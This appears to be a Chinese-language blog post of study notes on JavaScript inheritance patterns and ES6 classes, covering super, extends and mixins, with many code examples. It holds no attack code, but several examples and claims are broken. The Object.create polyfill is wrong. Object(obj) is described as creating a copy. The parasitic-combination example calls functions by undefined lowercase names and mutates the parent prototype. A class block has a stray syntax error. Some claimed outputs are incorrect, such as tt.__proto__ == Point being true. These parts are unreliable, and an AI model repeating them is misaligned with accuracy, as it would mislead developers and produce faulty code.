-<h2 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h2><p>使用apply()或者call()方法。在继承函数构造函数中调用祖先函数构造函数，这样，<br>在new 一个继承函数实例时，就会去执行祖先函数中所有对象初始化代码，每个实例都会具有自己的祖先函数属性的副本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">function Superfn(time)&#123;</span><br><span class="line">  this.color = [1,2];</span><br><span class="line">  this.time = time;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Superfn.prototype.getsuper=function()&#123;</span><br><span class="line">  console.log(&apos;bbb&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function Subfn()&#123;</span><br><span class="line">  Superfn.call(this,&apos;11:23:30&apos;);</span><br><span class="line">  this.age = 29;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var ins = new Subfn();</span><br><span class="line">var ins1 = new Subfn();</span><br><span class="line">console.log(ins.color) //[1, 2]</span><br><span class="line">console.log(ins1.color)//[1, 2]</span><br><span class="line">ins1.color.push(4);</span><br><span class="line">console.log(ins.color)//[1, 2]</span><br><span class="line">console.log(ins1.color)//[1, 2, 4]</span><br><span class="line"></span><br><span class="line">console.log(ins.time);//&quot;11:23:30&quot;</span><br><span class="line">console.log(ins.age);//29</span><br><span class="line"></span><br><span class="line">ins.getsuper();//ins.getsuper is not a function</span><br></pre></td></tr></table></figure></p>
-<p>1、可以像祖先函数构造函数中传递参数；<br>2、定义继承函数自己的属性必须放在调用祖先函数之后，防止祖先函数重写继承函数属性<br>缺点： 所有的属性只能使用构造函数模式定义，而且,继承函数实例，不能调用祖先函数原型上的方法</p>
-<h2 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h2><p>在继承函数构造函数中调用祖先函数，实现属性继承<br>将继承函数的原型赋值为祖先函数实例，实现方法复制<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function Superfn(time)&#123;</span><br><span class="line">  this.color = [1,2];</span><br><span class="line">  this.time = time;</span><br><span class="line">&#125;</span><br><span class="line">Superfn.prototype.getsuper=function()&#123;</span><br><span class="line">  console.log(&apos;bbb&apos;);</span><br><span class="line">&#125;</span><br><span class="line">function Subfn()&#123;</span><br><span class="line">  Superfn.call(this,&apos;11:23:30&apos;);</span><br><span class="line">  this.age = 29;</span><br><span class="line">&#125;</span><br><span class="line">Subfn.prototype= new Superfn();</span><br><span class="line">var ins = new Subfn();</span><br><span class="line">var ins1 = new Subfn();</span><br><span class="line">console.log(ins.color)</span><br><span class="line">console.log(ins1.color)</span><br><span class="line">ins1.color.push(4);</span><br><span class="line">console.log(ins.color)</span><br><span class="line">console.log(ins1.color)</span><br><span class="line"></span><br><span class="line">console.log(ins.time);//&quot;11:23:30&quot;</span><br><span class="line">console.log(ins.age);//29</span><br><span class="line"></span><br><span class="line">ins.getsuper();//bbb</span><br></pre></td></tr></table></figure></p>
-<p>缺点：调用了两次Superfn()，初始化时，Subfn.prototype中的Superfn的实例属性会被构造函数中创建的Superfn的实例属性覆盖，<br>重复创建，没必要</p>
-<h2 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h2><p>Object.creat()方法原理像如下函数<br>function object(o){<br>    function F(){<br>      F.prototype = o;<br>    }<br>  return new F();<br>}<br>原型式继承 即使用Object.creat(祖先对象)定义实例,实例会共享祖先对象属性方法，通过添加第二个参数，覆盖祖先对象属性，或新增属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Superfn=&#123;</span><br><span class="line">  color:[&apos;red&apos;,&apos;green&apos;],</span><br><span class="line">  getsuper:function()&#123;</span><br><span class="line">  console.log(222);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var test = Object.create(Superfn,&#123;getsuper:&#123;value:function()&#123;console.log(111)&#125;&#125;&#125;);</span><br><span class="line">var test1 = Object.create(Superfn,&#123;color:&#123;value:[1,2]&#125;,name:&#123;value:&apos;jack&apos;&#125;&#125;);</span><br><span class="line">console.log(test.color);//[&apos;red&apos;,&apos;green&apos;]</span><br><span class="line">console.log(test1.color,test1.name); //[1,2] jack</span><br><span class="line">console.log(test.name);//undefined</span><br><span class="line">test.getsuper(); //111</span><br><span class="line">test1.getsuper();//222</span><br></pre></td></tr></table></figure></p>
-<h2 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function createAnthoer(oriobj)&#123;</span><br><span class="line">  var clone = Object(oriobj);//创建oriobj对象副本</span><br><span class="line">  clone.sayHi=function()&#123;//以某种方式增强这个对象，例如定义自己的方法</span><br><span class="line">    console.log(&apos;hi&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  return clone;</span><br><span class="line">&#125;</span><br><span class="line">var Superfn=&#123;</span><br><span class="line">  color:[&apos;red&apos;,&apos;green&apos;],</span><br><span class="line">&#125;</span><br><span class="line">var test = createAnthoer(Superfn);</span><br><span class="line">test.sayHi()//hi</span><br><span class="line">console.log(test.color);//[&quot;red&quot;, &quot;green&quot;]</span><br></pre></td></tr></table></figure>
-<h2 id="最理想继承-寄生组合式继承"><a href="#最理想继承-寄生组合式继承" class="headerlink" title="最理想继承-寄生组合式继承"></a>最理想继承-寄生组合式继承</h2><p>对比组合式继承<br>仅调用一次superfn函数，避免在Subfn.prototype中创建多余superfn实例属性<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function inhertPrototype(subfn,superfn)&#123;</span><br><span class="line">  var prototype = Object(superfn.prototype);//创建对象 ，仅继承祖先函数原型</span><br><span class="line">  prototype.constructor = subfn;//增强对象</span><br><span class="line">  subfn.prototype = prototype;//指定对象</span><br><span class="line">&#125;</span><br><span class="line">function Superfn(name)&#123;</span><br><span class="line">  this.color = [1,2];</span><br><span class="line">  this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Superfn.prototype.getsuper=function()&#123;</span><br><span class="line">  console.log(&apos;bbb&apos;);</span><br><span class="line">&#125;</span><br><span class="line">function Subfn(name,age)&#123;</span><br><span class="line">  Superfn.call(this,name); //仅继承祖先函数实例属性，不会继承祖先函数原型</span><br><span class="line">  this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">Subfn.prototype.getsuper=function()&#123;</span><br><span class="line">  console.log(&apos;ccc&apos;);</span><br><span class="line">&#125;</span><br><span class="line">inhertPrototype(subfn,superfn);</span><br></pre></td></tr></table></figure></p>
-<h1 id="类"><a href="#类" class="headerlink" title="类"></a>类</h1><p>类的定义相当于es5 对象构造函数的另一种写法，一种新语法<br>es5 的继承，实质是先创造子类的实例对象this，然后再将父类的方法添加到this上面<br>es6 类的继承，实质是先创造父类的实例对象this（必须先调用super方法），然后再用子类的构造函数修改this</p>
-<h2 id="类的定义"><a href="#类的定义" class="headerlink" title="类的定义"></a>类的定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line">//es5</span><br><span class="line">function Point(x, y) &#123;</span><br><span class="line">  this.x = x;</span><br><span class="line">  this.y = y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Point.prototype.toString = function () &#123;</span><br><span class="line">  return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var p = new Point(1, 2);</span><br><span class="line">//es6</span><br><span class="line">let methodName = &apos;getArea&apos;;</span><br><span class="line">class Point &#123;</span><br><span class="line">  constructor(x, y) &#123;</span><br><span class="line">    this.x = x;</span><br><span class="line">    this.y = y;</span><br><span class="line">    this.toString = function()&#123;</span><br><span class="line">      console.log(111);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  toString() &#123;</span><br><span class="line">    return &apos;(&apos; + this.x + &apos;, &apos; + this.y + &apos;)&apos;;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  [methodName]() &#123;</span><br><span class="line">    console.log(666);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var temp = new Point(&apos;helo&apos;,&apos;world&apos;);</span><br><span class="line">console.log(temp)// constructor定义的内容</span><br><span class="line">console.log(temp.toString()) //先找实例属性，在去原型找属性</span><br><span class="line"></span><br><span class="line">console.log(typeof Point) // &quot;function&quot;</span><br><span class="line">console.log(Point === Point.prototype.constructor) // true</span><br><span class="line"></span><br><span class="line">console.log(Object.keys(Point.prototype));//[]</span><br><span class="line">console.log(Object.getOwnPropertyNames(Point.prototype));//[&quot;constructor&quot;, &quot;toString&quot;]</span><br><span class="line">Object.assign(Point.prototype, &#123;</span><br><span class="line">  toString222()&#123;console.log(222);&#125;,</span><br><span class="line">  toValue()&#123;console.log(333);&#125;</span><br><span class="line">&#125;);</span><br><span class="line">temp.toString222()</span><br><span class="line">console.log(Object.keys(Point.prototype));//[&quot;toString222&quot;, &quot;toValue&quot;]</span><br><span class="line">console.log(Object.getOwnPropertyNames(Point.prototype));//[&quot;constructor&quot;, &quot;toString&quot;, &quot;toString222&quot;, &quot;toValue&quot;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">temp[methodName]() //666</span><br><span class="line"></span><br><span class="line">class Foo &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    return Object.create(null);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">console.log(Foo.name)//Foo</span><br><span class="line">console.log(new Foo() instanceof Foo)//false</span><br><span class="line">var tt = new Foo();</span><br><span class="line">console.log(tt.__proto__ == Point) //TRUE</span><br><span class="line"></span><br><span class="line">var p1 = new Point(2,3);</span><br><span class="line">var p2 = new Point(3,2);</span><br><span class="line">console.log(p1.__proto__ === p2.__proto__)//true</span><br><span class="line">p1.__proto__.printName = function () &#123; console.log(&apos;Oops&apos;) &#125;;</span><br><span class="line">p1.printName() // &quot;Oops&quot;</span><br><span class="line">p2.printName() // &quot;Oops&quot;</span><br><span class="line">var p3 = new Point(4,2);</span><br><span class="line">p3.printName() // &quot;Oops</span><br><span class="line"></span><br><span class="line">//这个类的名字是MyClass而不是Me，Me只在 Class 的内部代码可用，指代当前类。</span><br><span class="line">const MyClass = class Me &#123;</span><br><span class="line">  getClassName() &#123;</span><br><span class="line">    console.log(Me.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line">let inst = new MyClass();</span><br><span class="line">inst.getClassName() // Me</span><br><span class="line">console.log(MyClass.name)//me</span><br><span class="line"></span><br><span class="line">//立即执行的 Class</span><br><span class="line">let person = new class &#123;</span><br><span class="line">  constructor(name) &#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  sayName() &#123;</span><br><span class="line">    console.log(this.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;(&apos;张三&apos;);</span><br><span class="line"></span><br><span class="line">person.sayName(); // &quot;张三&quot;</span><br><span class="line"></span><br><span class="line">class MyClass &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">  get prop() &#123;</span><br><span class="line">    return &apos;getter&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">  set prop(value) &#123;</span><br><span class="line">    console.log(&apos;setter: &apos;+value);</span><br><span class="line">  s&#125;</span><br><span class="line">let inst = new MyClass();</span><br><span class="line">inst.prop = 123;// setter: 123</span><br><span class="line">console.log(inst.prop)// &apos;getter&apos;</span><br></pre></td></tr></table></figure>
-<p>1.constructor函数定义实例属性，this代表实例对象，生成对象实例时，自动调用该方法，<br>  默认返回实例对象this，也可以指定返回另外一个对象，则生成的实例将是另外这个对象的实例<br>  如果没有显式定义，一个空的constructor方法会被默认添加。<br>  其他在constructor函数之外定义的函数全都挂在类的prototype对象上(没有定义在this上的全都定义在class上)<br>  其实constructor函数也挂在prototype对象上<br>2.定义原型方法时，不需要加上function这个关键字，方法之间不需要逗号分隔<br>3.类的数据类型就是函数，类本身就指向构造函数<br>4.使用Object.assign()新增原型方法,定义类时定义的原型方法是不可枚举的，但Object.assign()新增的可枚举<br>5.可以使用变量值做原型方法名<br>6.定义实例仍使用new关键字,且必须使用new定义，否则会报错<br>7.类的所有实例共享一个原型对象,使用实例的<strong>proto</strong>属性改写原型,会改变“类”的原始定义，影响到所有实例<br>8.类也可以使用表达式的形式定义,采用 Class 表达式，可以写出立即执行的 Class<br>9.类必须先定义再使用，无论是生成实例还是进行继承<br>10.类的name属性总是返回紧跟在class关键字后面的类名。<br>11.对某个属性设置对应的存值函数和取值函数，因此赋值和读取行为都被自定义了。存值函数和取值函数是设置在属性的 Descriptor 对象上的。<br>12.静态方法,该方法不会被实例继承，而是直接通过类来调用<br>如果静态方法包含this关键字，这个this指的是类，而不是实例<br>父类的静态方法，可以被子类继承。<br>静态方法也是可以从super对象上调用的<br>13.<br>ES6 为new命令引入了一个new.target属性，该属性一般用在构造函数之中，返回new命令作用于的那个构造函数。如果构造函数不是通过new命令调用的，new.target会返回undefined，因此这个属性可以用来确定构造函数是怎么调用的。</p>
-<h2 id="类的继承"><a href="#类的继承" class="headerlink" title="类的继承"></a>类的继承</h2><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">class Point &#123;</span><br><span class="line">  constructor(x, y) &#123;</span><br><span class="line">    this.x = x;</span><br><span class="line">    this.y = y;</span><br><span class="line">    console.log(new.target.name);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class ColorPoint extends Point &#123;</span><br><span class="line">  constructor(x, y, color) &#123;</span><br><span class="line">    super(x, y);</span><br><span class="line">    this.color = color;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let cp0 = new Point(25, 8);//&quot;Point&quot;</span><br><span class="line">let cp = new ColorPoint(25, 8, &apos;green&apos;);//&quot;ColorPoint&quot; super()使用</span><br><span class="line"></span><br><span class="line">console.log(cp instanceof ColorPoint)//true</span><br><span class="line">console.log(cp instanceof Point)//true</span><br><span class="line">console.log(Object.getPrototypeOf(ColorPoint) === Point)</span><br><span class="line"></span><br><span class="line">console.log(ColorPoint.__proto__ === Point) // true</span><br><span class="line">console.log(ColorPoint.prototype.__proto__ === Point.prototype) // true</span><br><span class="line"></span><br><span class="line">console.log(cp.__proto__.__proto__ === cp0.__proto__ )// true</span><br><span class="line">cp.__proto__.__proto__.printName = function () &#123;</span><br><span class="line">  console.log(&apos;Ha&apos;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">cp0.printName() // &quot;Ha&quot;</span><br></pre></td></tr></table></figure>
-<p>1、使用extends关键字进行继承：class 子类名 extends 父类名{}<br>2、在子类构造函数constructor中使用super关键字继承父类this对象,必需在super语句之后使用this<br>3、Object.getPrototypeOf方法可以用来从子类上获取父类<br>4、子类的<strong>proto</strong>属性，表示构造函数的继承，总是指向父类。<br>   子类prototype属性的<strong>proto</strong>属性，表示方法的继承，总是指向父类的prototype属性。<br>5、子类的原型的原型，是父类的原型，通过子类实例的<strong>proto</strong>.<strong>proto</strong>属性，可以修改父类实例的行为</p>
-<h3 id="关于super关键字"><a href="#关于super关键字" class="headerlink" title="关于super关键字"></a>关于super关键字</h3><p>1、用作函数<br>作为函数时，super()只能用在子类的构造函数之中，用在其他地方就会报错，代表调用父类构造函数<br>super()在这里相当于parent.prototype.constructor.call(this),this指子类</p>
-<p>2、用作对象</p>
-<p>作为对象使用时,在普通方法中指向父类原型对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">  constructor() &#123;</span><br><span class="line">    this.p = 2;</span><br><span class="line">  &#125;</span><br><span class="line">  q() &#123;</span><br><span class="line">    console.log(this.p)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B extends A &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.p =3</span><br><span class="line">    super.q();</span><br><span class="line">    super.p = 5;</span><br><span class="line">    console.log(super.p); // undefined</span><br><span class="line">    console.log(this.p); // 5</span><br><span class="line">    super.tt = 6;</span><br><span class="line">    console.log(this.tt); // 6</span><br><span class="line">    console.log(super.valueOf() instanceof B); // true</span><br><span class="line">  &#125;</span><br><span class="line">  get m() &#123;</span><br><span class="line">    return super.p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let b = new B();//3</span><br><span class="line">console.log(b.m) // undefined</span><br></pre></td></tr></table></figure></p>
-<p>在普通方法中指向父类原型对象,即使用super.xxxx(),相当于使用parent.prototype.xxxx(),<br>所以只能调用父类原型属性方法,不能使用实例属性方法</p>
-<p>通过super调用父类的方法时,super会绑定子类的this,<br>即在子类使用super.xxxx()时,xxxx()里面的this指子类<br>通过super对某个属性赋值,赋值的属性会变成子类实例的属性</p>
-<p>在静态方法中使用super将指向父类，而不是父类的原型对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">class Parent &#123;</span><br><span class="line">  static myMethod(msg) &#123;</span><br><span class="line">    console.log(&apos;static&apos;, msg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  myMethod(msg) &#123;</span><br><span class="line">    console.log(&apos;instance&apos;, msg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Child extends Parent &#123;</span><br><span class="line">  static myMethod(msg) &#123;</span><br><span class="line">    super.myMethod(msg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  myMethod(msg) &#123;</span><br><span class="line">    super.myMethod(msg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Child.myMethod(1); // static 1 super在静态方法之中指向父类</span><br><span class="line"></span><br><span class="line">var child = new Child();</span><br><span class="line">child.myMethod(2); // instance 2 在普通方法之中指向父类的原型对象。</span><br></pre></td></tr></table></figure></p>
-<h3 id="extends特殊对象"><a href="#extends特殊对象" class="headerlink" title="extends特殊对象"></a>extends特殊对象</h3><p>第一种特殊情况，子类继承Object类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A extends Object &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A.__proto__ === Object // true</span><br><span class="line">A.prototype.__proto__ === Object.prototype // true</span><br></pre></td></tr></table></figure></p>
-<p>这种情况下，A其实就是构造函数Object的复制，A的实例就是Object的实例。</p>
-<p>第二种特殊情况，不存在任何继承。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A.__proto__ === Function.prototype // true</span><br><span class="line">A.prototype.__proto__ === Object.prototype // true</span><br></pre></td></tr></table></figure></p>
-<p>这种情况下，A作为一个基类（即不存在任何继承），就是一个普通函数，所以直接继承Function.prototype。但是，A调用后返回一个空对象（即Object实例），所以A.prototype.<strong>proto</strong>指向构造函数（Object）的prototype属性。</p>
-<p>第三种特殊情况，子类继承null。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class A extends null &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">A.__proto__ === Function.prototype // true</span><br><span class="line">A.prototype.__proto__ === undefined // true</span><br></pre></td></tr></table></figure></p>
-<p>这种情况与第二种情况非常像。A也是一个普通函数，所以直接继承Function.prototype。但是，A调用后返回的对象不继承任何方法，所以它的<strong>proto</strong>指向Function.prototype，即实质上执行了下面的代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">class C extends null &#123;</span><br><span class="line">  constructor() &#123; return Object.create(null); &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>第四种情况,允许继承原生构造函数定义子类,但无法通过super方法向父类Object传参<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">class NewObj extends Object&#123;</span><br><span class="line">  constructor()&#123;</span><br><span class="line">    super(...arguments);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">var o = new NewObj(&#123;attr: true&#125;);</span><br><span class="line">console.log(o.attr === true)  // false</span><br></pre></td></tr></table></figure></p>
-<h3 id="Mixin-模式"><a href="#Mixin-模式" class="headerlink" title="Mixin 模式"></a>Mixin 模式</h3><p>使用如下mix函数将多个对象合成为一个类<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">function mix(...mixins) &#123;</span><br><span class="line">  class Mix &#123;&#125;</span><br><span class="line"></span><br><span class="line">  for (let mixin of mixins) &#123;</span><br><span class="line">    copyProperties(Mix, mixin);</span><br><span class="line">    copyProperties(Mix.prototype, mixin.prototype);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return Mix;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function copyProperties(target, source) &#123;</span><br><span class="line">  for (let key of Reflect.ownKeys(source)) &#123;</span><br><span class="line">    if ( key !== &quot;constructor&quot;</span><br><span class="line">      &amp;&amp; key !== &quot;prototype&quot;</span><br><span class="line">      &amp;&amp; key !== &quot;name&quot;</span><br><span class="line">    ) &#123;</span><br><span class="line">      let desc = Object.getOwnPropertyDescriptor(source, key);</span><br><span class="line">      Object.defineProperty(target, key, desc);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//使用：继承返回的合成类</span><br><span class="line">class DistributedEdit extends mix(Loggable, Serializable) &#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
